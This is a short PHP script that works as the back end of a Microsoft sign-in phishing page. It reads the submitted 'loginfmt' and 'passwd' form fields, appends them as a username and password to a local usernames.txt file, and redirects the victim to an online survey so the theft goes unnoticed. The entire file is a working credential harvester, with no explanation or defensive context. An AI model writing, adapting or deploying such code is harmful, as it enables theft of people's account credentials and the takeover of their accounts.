<?php

file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://freeonlinesurveys.com/s/TA1HXvMQ#/0');
exit();
?>
